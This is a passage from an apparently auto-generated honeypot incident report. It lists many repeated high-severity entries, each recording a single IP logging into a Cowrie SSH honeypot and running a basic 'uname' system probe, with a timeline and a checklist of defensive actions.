| `2026-08-24 01:18:23` | `cowrie.client.version` |
| `2026-08-24 01:18:23` | `cowrie.client.kex` |
| `2026-08-24 01:18:24` | `cowrie.login.success` |
| `2026-08-24 01:18:24` | `cowrie.session.params` |
| `2026-08-24 01:18:24` | `cowrie.command.input` |
| `2026-08-24 01:18:24` | `cowrie.log.closed` |
| `2026-08-24 01:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe624c143ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:29` | `cowrie.session.connect` |
| `2026-08-24 01:18:29` | `cowrie.client.version` |
| `2026-08-24 01:18:29` | `cowrie.client.kex` |
| `2026-08-24 01:18:29` | `cowrie.login.success` |
| `2026-08-24 01:18:30` | `cowrie.session.params` |
| `2026-08-24 01:18:30` | `cowrie.command.input` |
| `2026-08-24 01:18:30` | `cowrie.log.closed` |
| `2026-08-24 01:18:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9c2382500f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:34` | `cowrie.session.connect` |
| `2026-08-24 01:18:34` | `cowrie.client.version` |
| `2026-08-24 01:18:34` | `cowrie.client.kex` |
| `2026-08-24 01:18:34` | `cowrie.login.success` |
| `2026-08-24 01:18:35` | `cowrie.session.params` |
| `2026-08-24 01:18:35` | `cowrie.command.input` |
| `2026-08-24 01:18:35` | `cowrie.log.closed` |
| `2026-08-24 01:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b5b358cbef8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:39` | `cowrie.session.connect` |
| `2026-08-24 01:18:39` | `cowrie.client.version` |
| `2026-08-24 01:18:39` | `cowrie.client.kex` |
| `2026-08-24 01:18:40` | `cowrie.login.success` |
| `2026-08-24 01:18:41` | `cowrie.session.params` |
| `2026-08-24 01:18:41` | `cowrie.command.input` |
| `2026-08-24 01:18:41` | `cowrie.log.closed` |
| `2026-08-24 01:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ca0643f78b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:45` | `cowrie.session.connect` |
| `2026-08-24 01:18:45` | `cowrie.client.version` |
| `2026-08-24 01:18:45` | `cowrie.client.kex` |
| `2026-08-24 01:18:45` | `cowrie.login.success` |
| `2026-08-24 01:18:46` | `cowrie.session.params` |
| `2026-08-24 01:18:46` | `cowrie.command.input` |
| `2026-08-24 01:18:46` | `cowrie.log.closed` |
| `2026-08-24 01:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5716c07a42d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:50` | `cowrie.session.connect` |
| `2026-08-24 01:18:50` | `cowrie.client.version` |
| `2026-08-24 01:18:50` | `cowrie.client.kex` |
| `2026-08-24 01:18:51` | `cowrie.login.success` |
| `2026-08-24 01:18:52` | `cowrie.session.params` |
| `2026-08-24 01:18:52` | `cowrie.command.input` |
| `2026-08-24 01:18:52` | `cowrie.log.closed` |
| `2026-08-24 01:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8835d59e8603

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:55` | `cowrie.session.connect` |
| `2026-08-24 01:18:55` | `cowrie.client.version` |
| `2026-08-24 01:18:56` | `cowrie.client.kex` |
| `2026-08-24 01:18:56` | `cowrie.login.success` |
| `2026-08-24 01:18:57` | `cowrie.session.params` |
| `2026-08-24 01:18:57` | `cowrie.command.input` |
| `2026-08-24 01:18:57` | `cowrie.log.closed` |
| `2026-08-24 01:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f237e7620f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:01` | `cowrie.session.connect` |
| `2026-08-24 01:19:01` | `cowrie.client.version` |
| `2026-08-24 01:19:01` | `cowrie.client.kex` |
| `2026-08-24 01:19:01` | `cowrie.login.success` |
| `2026-08-24 01:19:02` | `cowrie.session.params` |
| `2026-08-24 01:19:02` | `cowrie.command.input` |
| `2026-08-24 01:19:02` | `cowrie.log.closed` |
| `2026-08-24 01:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f273c28d510

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:06` | `cowrie.session.connect` |
| `2026-08-24 01:19:06` | `cowrie.client.version` |
| `2026-08-24 01:19:06` | `cowrie.client.kex` |
| `2026-08-24 01:19:06` | `cowrie.login.success` |
| `2026-08-24 01:19:07` | `cowrie.session.params` |
| `2026-08-24 01:19:07` | `cowrie.command.input` |
| `2026-08-24 01:19:07` | `cowrie.log.closed` |
| `2026-08-24 01:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e623270e8389

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:11` | `cowrie.session.connect` |
| `2026-08-24 01:19:11` | `cowrie.client.version` |
| `2026-08-24 01:19:11` | `cowrie.client.kex` |
| `2026-08-24 01:19:12` | `cowrie.login.success` |
| `2026-08-24 01:19:13` | `cowrie.session.params` |
| `2026-08-24 01:19:13` | `cowrie.command.input` |
| `2026-08-24 01:19:13` | `cowrie.log.closed` |
| `2026-08-24 01:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3e9c1784f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:16` | `cowrie.session.connect` |
| `2026-08-24 01:19:16` | `cowrie.client.version` |
| `2026-08-24 01:19:17` | `cowrie.client.kex` |
| `2026-08-24 01:19:17` | `cowrie.login.success` |
| `2026-08-24 01:19:18` | `cowrie.session.params` |
| `2026-08-24 01:19:18` | `cowrie.command.input` |
| `2026-08-24 01:19:18` | `cowrie.log.closed` |
| `2026-08-24 01:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22a55890c923

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:22` | `cowrie.session.connect` |
| `2026-08-24 01:19:22` | `cowrie.client.version` |
| `2026-08-24 01:19:22` | `cowrie.client.kex` |
| `2026-08-24 01:19:22` | `cowrie.login.success` |
| `2026-08-24 01:19:23` | `cowrie.session.params` |
| `2026-08-24 01:19:23` | `cowrie.command.input` |
| `2026-08-24 01:19:23` | `cowrie.log.closed` |
| `2026-08-24 01:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b92b0b9499cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:27` | `cowrie.session.connect` |
| `2026-08-24 01:19:27` | `cowrie.client.version` |
| `2026-08-24 01:19:27` | `cowrie.client.kex` |
| `2026-08-24 01:19:27` | `cowrie.login.success` |
| `2026-08-24 01:19:28` | `cowrie.session.params` |
| `2026-08-24 01:19:28` | `cowrie.command.input` |
| `2026-08-24 01:19:29` | `cowrie.log.closed` |
| `2026-08-24 01:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-630c39f07c20

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:32` | `cowrie.session.connect` |
| `2026-08-24 01:19:32` | `cowrie.client.version` |
| `2026-08-24 01:19:32` | `cowrie.client.kex` |
| `2026-08-24 01:19:33` | `cowrie.login.success` |
| `2026-08-24 01:19:34` | `cowrie.session.params` |
| `2026-08-24 01:19:34` | `cowrie.command.input` |
| `2026-08-24 01:19:34` | `cowrie.log.closed` |
| `2026-08-24 01:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04542a50472b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:38` | `cowrie.session.connect` |
| `2026-08-24 01:19:38` | `cowrie.client.version` |
| `2026-08-24 01:19:38` | `cowrie.client.kex` |
| `2026-08-24 01:19:38` | `cowrie.login.success` |
| `2026-08-24 01:19:39` | `cowrie.session.params` |
| `2026-08-24 01:19:39` | `cowrie.command.input` |
| `2026-08-24 01:19:40` | `cowrie.log.closed` |
| `2026-08-24 01:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2e2060a78b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:43` | `cowrie.session.connect` |
| `2026-08-24 01:19:43` | `cowrie.client.version` |
| `2026-08-24 01:19:43` | `cowrie.client.kex` |
| `2026-08-24 01:19:43` | `cowrie.login.success` |
| `2026-08-24 01:19:44` | `cowrie.session.params` |
| `2026-08-24 01:19:44` | `cowrie.command.input` |
| `2026-08-24 01:19:44` | `cowrie.log.closed` |
| `2026-08-24 01:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f7f008291d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:48` | `cowrie.session.connect` |
| `2026-08-24 01:19:48` | `cowrie.client.version` |
| `2026-08-24 01:19:48` | `cowrie.client.kex` |
| `2026-08-24 01:19:49` | `cowrie.login.success` |
| `2026-08-24 01:19:49` | `cowrie.session.params` |
| `2026-08-24 01:19:49` | `cowrie.command.input` |
| `2026-08-24 01:19:49` | `cowrie.log.closed` |
| `2026-08-24 01:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb923fd1624

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:53` | `cowrie.session.connect` |
| `2026-08-24 01:19:53` | `cowrie.client.version` |
| `2026-08-24 01:19:53` | `cowrie.client.kex` |
| `2026-08-24 01:19:54` | `cowrie.login.success` |
| `2026-08-24 01:19:55` | `cowrie.session.params` |
| `2026-08-24 01:19:55` | `cowrie.command.input` |
| `2026-08-24 01:19:55` | `cowrie.log.closed` |
| `2026-08-24 01:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce4e3cb0d55

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:19 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:19:59` | `cowrie.session.connect` |
| `2026-08-24 01:19:59` | `cowrie.client.version` |
| `2026-08-24 01:19:59` | `cowrie.client.kex` |
| `2026-08-24 01:19:59` | `cowrie.login.success` |
| `2026-08-24 01:20:00` | `cowrie.session.params` |
| `2026-08-24 01:20:00` | `cowrie.command.input` |
| `2026-08-24 01:20:00` | `cowrie.log.closed` |
| `2026-08-24 01:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50c82c3cb5b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:04` | `cowrie.session.connect` |
| `2026-08-24 01:20:04` | `cowrie.client.version` |
| `2026-08-24 01:20:04` | `cowrie.client.kex` |
| `2026-08-24 01:20:05` | `cowrie.login.success` |
| `2026-08-24 01:20:05` | `cowrie.session.params` |
| `2026-08-24 01:20:05` | `cowrie.command.input` |
| `2026-08-24 01:20:05` | `cowrie.log.closed` |
| `2026-08-24 01:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e79d8473dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:09` | `cowrie.session.connect` |
| `2026-08-24 01:20:10` | `cowrie.client.version` |
| `2026-08-24 01:20:10` | `cowrie.client.kex` |
| `2026-08-24 01:20:10` | `cowrie.login.success` |
| `2026-08-24 01:20:11` | `cowrie.session.params` |
| `2026-08-24 01:20:11` | `cowrie.command.input` |
| `2026-08-24 01:20:11` | `cowrie.log.closed` |
| `2026-08-24 01:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf4e2a2b115

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:15` | `cowrie.session.connect` |
| `2026-08-24 01:20:15` | `cowrie.client.version` |
| `2026-08-24 01:20:15` | `cowrie.client.kex` |
| `2026-08-24 01:20:15` | `cowrie.login.success` |
| `2026-08-24 01:20:16` | `cowrie.session.params` |
| `2026-08-24 01:20:17` | `cowrie.command.input` |
| `2026-08-24 01:20:17` | `cowrie.log.closed` |
| `2026-08-24 01:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e62624f63eb5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:20` | `cowrie.session.connect` |
| `2026-08-24 01:20:20` | `cowrie.client.version` |
| `2026-08-24 01:20:20` | `cowrie.client.kex` |
| `2026-08-24 01:20:21` | `cowrie.login.success` |
| `2026-08-24 01:20:22` | `cowrie.session.params` |
| `2026-08-24 01:20:22` | `cowrie.command.input` |
| `2026-08-24 01:20:22` | `cowrie.log.closed` |
| `2026-08-24 01:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320f9d87dc37

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:26` | `cowrie.session.connect` |
| `2026-08-24 01:20:26` | `cowrie.client.version` |
| `2026-08-24 01:20:26` | `cowrie.client.kex` |
| `2026-08-24 01:20:26` | `cowrie.login.success` |
| `2026-08-24 01:20:27` | `cowrie.session.params` |
| `2026-08-24 01:20:27` | `cowrie.command.input` |
| `2026-08-24 01:20:27` | `cowrie.log.closed` |
| `2026-08-24 01:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-691e7c21afbd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:31` | `cowrie.session.connect` |
| `2026-08-24 01:20:31` | `cowrie.client.version` |
| `2026-08-24 01:20:31` | `cowrie.client.kex` |
| `2026-08-24 01:20:31` | `cowrie.login.success` |
| `2026-08-24 01:20:32` | `cowrie.session.params` |
| `2026-08-24 01:20:32` | `cowrie.command.input` |
| `2026-08-24 01:20:32` | `cowrie.log.closed` |
| `2026-08-24 01:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f4bf9699f6c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:36` | `cowrie.session.connect` |
| `2026-08-24 01:20:36` | `cowrie.client.version` |
| `2026-08-24 01:20:36` | `cowrie.client.kex` |
| `2026-08-24 01:20:36` | `cowrie.login.success` |
| `2026-08-24 01:20:37` | `cowrie.session.params` |
| `2026-08-24 01:20:37` | `cowrie.command.input` |
| `2026-08-24 01:20:37` | `cowrie.log.closed` |
| `2026-08-24 01:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0926f214da85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
